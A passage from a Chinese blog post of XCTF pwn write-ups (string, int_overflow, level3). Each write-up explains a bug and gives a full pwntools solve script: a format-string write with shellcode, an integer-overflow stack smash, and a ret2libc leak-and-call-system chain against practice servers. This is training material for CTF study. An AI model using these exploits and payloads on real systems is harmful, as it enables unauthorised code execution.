+<p><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-56-49.png" alt="2020-06-06-13-56-49"><br>在第二个函数中发现了格式化字符串漏洞，触发条件为<code>v1==1</code>  </p>
+<p><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-59-15.png" alt="2020-06-06-13-59-15"><br>在第三个函数中发现了关键代码，程序将用户输入的字符强制转化成函数执行，执行的条件就是<code>*a1 == a1[1]</code>,逆推发现<code>a1</code>就是<code>V3</code>,所以条件就是<code>V3[0]=V3[1]</code>就是这里可以用来输入<code>shellcode</code>.</p>
+<p><strong>攻击思路:</strong> 利用格式化字符创漏洞修改<code>V3[0]</code>的值，再输入一个<code>shellcode</code>获取shell,可以在<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a>网站上找到对应的<code>shellcode</code>来获取shell  </p>
+<p><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'35103'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v3 = int(io.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">'name be:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'aa'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'east or up?:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'east'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'or leave(0)?:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'address\'\n'</span>)</span><br><span class="line">io.sendline(str(v3))	<span class="comment"># str用于将十进制以字符串形式输出，例：111输出'111'</span></span><br><span class="line">io.recvuntil(<span class="string">' wish is:\n'</span>)</span><br><span class="line">payload = <span class="string">'%85c%7$n'</span>	</span><br><span class="line"><span class="comment"># 64位程序格式化字符串漏洞中，格式化字符串的第六个偏移地址是调用printf的函数的栈上的第一个QWORD(64位)</span></span><br><span class="line"><span class="comment"># 而第二个QWORD即为V2的值</span></span><br><span class="line"><span class="comment"># 所以这里我们的偏移地址设为7，修改V2所指向的V3[0]</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">'YOU SPELL\n'</span>)</span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0A-int-overflow"><a href="#0x0A-int-overflow" class="headerlink" title="0x0A int_overflow"></a>0x0A int_overflow</h2><blockquote>
+<p>题目描述: 菜鸡感觉这题似乎没有办法溢出，真的么?</p>
+</blockquote>
+<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-06-33.png" alt="2020-06-06-16-06-33">    </p>
+<p>拖入IDA查看反汇编代码<br>跟近查看，进入到<code>chek_passwd</code><br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-22-15.png" alt="2020-06-06-16-22-15"><br>出现危险函数<code>strcpy</code>，存在栈溢出漏洞，但是要想触发漏洞，必须使得v3在3和8之间<br>v3的值为s字符串的长度，根据题目提示想到整数溢出，利用整数溢出触发漏洞  </p>
+<p><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'46540'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'username:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'aa'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'passwd:\n'</span>)</span><br><span class="line"><span class="comment"># v3大小为8个字节，范围为0~255</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804868B</span>)+<span class="string">'A'</span>*(<span class="number">259</span><span class="number">-0x18</span><span class="number">-4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x0B-level3"><a href="#0x0B-level3" class="headerlink" title="0x0B level3"></a>0x0B level3</h2><blockquote>
+<p>题目描述: libc!libc!这次没有system，你能帮菜鸡解决这个难题么?</p>
+</blockquote>
+<p>题目提供的文件是一个压缩包，解压之后有两个文件，一个是可执行文件，还有一个动态链接库文件<br>关于plt、got、动态链接之间的关系可以参考  </p>
+<ul>
+<li><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a>  </li>
+<li><a href="https://blog.csdn.net/linyt/article/details/51893258" target="_blank" rel="noopener">Linux动态链接中的PLT和GOT</a>  </li>
+</ul>
+<p><code>libc_32.so.6</code>中存放的是程序运行时所用到的外部函数，通过PLT表和GOT表连接到主程序中   </p>
+<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-58-09.png" alt="2020-06-06-16-58-09"><br>没有开启<code>PIE</code>，所以<code>libc</code>中函数的相对地址不发生变化(程序自带函数地址也不会发生变化)，也就是说只要知道<code>libc</code>在程序中的的基址，根据偏移地址就可以知道任何函数在程序中的实际地址  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-17-35-00.png" alt="2020-06-06-17-35-00"><br>在<code>vulnerable_function()</code>中<code>read()</code>函数存在溢出，然而程序中并没有现成的system函数，所以必须想办法调用动态连接库中的函数</p>
+<p><strong>攻击思路:</strong> 利用栈溢出返回到<code>write</code>函数(注意:只能通过plt调用函数，不能直接跳转到got表)，同时传入<code>write</code>函数的<code>got</code>表的地址，由于程序没有开启<code>PIE</code>保护，所以程序中<code>plt</code>表和<code>got</code>表的位置都是不会变化的，函数的相对地址也是固定的，所以可以通过本地的程序获取<code>write</code>函数<code>got</code>表的地址，然后输出<code>write</code>函数实际地址。<br>将得到的实际地址与<code>libc</code>中的<code>write</code>的偏移地址相减，则可以得到<code>libc</code>的基地址，加上<code>system</code>函数在<code>libc</code>里面的偏移地址，就可以得到<code>system</code>函数在程序中的实际地址<br>此时利用溢出再次控制返回函数到<code>main</code>函数，二次攻击溢出返回到<code>system</code>函数，传入<code>/bin/sh</code>参数，就可以得到<code>shell</code>了  </p>
+<p><strong>注:</strong> 字符串<code>/bin/sh</code>可以在libc中找到，查找方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -a -t x libc_32.so.6 | grep &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解题脚本:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]    <span class="comment">#返回的是数字，非字符</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_off = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'47190'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x8c</span>+p32(write_plt)+p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>) <span class="comment">#传入参数write(1,write_got,4)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = write_addr-write_off        <span class="comment">#计算出libc基址</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]+libc_addr  <span class="comment">#libc基址加上system偏移地址得到实际地址</span></span><br><span class="line">bin_sh_addr = <span class="number">0x15902b</span> + libc_addr      <span class="comment">#基址加上使用strings得到的/bin/sh的偏移地址</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x8c</span>+p32(system_addr)+<span class="string">'A'</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<p>参考链接<br><a href="https://www.cnblogs.com/at0de/p/11269120.html" target="_blank" rel="noopener">https://www.cnblogs.com/at0de/p/11269120.html</a><br><a href="https://bbs.pediy.com/thread-254858.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254858.htm</a><br><a href="https://www.jianshu.com/p/457520f97a76" target="_blank" rel="noopener">https://www.jianshu.com/p/457520f97a76</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/xctf/" rel="tag"># xctf</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/06/hexo%E5%90%8C%E6%97%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E5%92%8Ccoding/" rel="next" title="hexo同时部署到github和coding">
+      hexo同时部署到github和coding <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-get-shell"><span class="nav-text">0x01 get_shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CGfsb"><span class="nav-text">0x02 CGfsb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-when-did-you-born"><span class="nav-text">0x03 when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-hello-pwn"><span class="nav-text">0x04 hello_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-level0"><span class="nav-text">0x05 level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-level2"><span class="nav-text">0x06 level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-guess-num"><span class="nav-text">0x07 guess_num</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-cgpwn2"><span class="nav-text">0x08 cgpwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-string"><span class="nav-text">0x09 string</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-int-overflow"><span class="nav-text">0x0A int_overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-level3"><span class="nav-text">0x0B level3</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AGX"
+      src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-07-06-19-58-11.png">
+  <p class="site-author-name" itemprop="name">AGX</p>
+  <div class="site-description" itemprop="description">加油，加油，加油！！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/agxagxagx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;agxagxagx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1657748706@qq.com" title="E-Mail → mailto:1657748706@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AGX</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'w6YhcCENLPLLmDUxBvQd2NAE-gzGzoHsz',
+      appKey     : 'tm4n8isSFLtvmQ86MCYl87KK',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
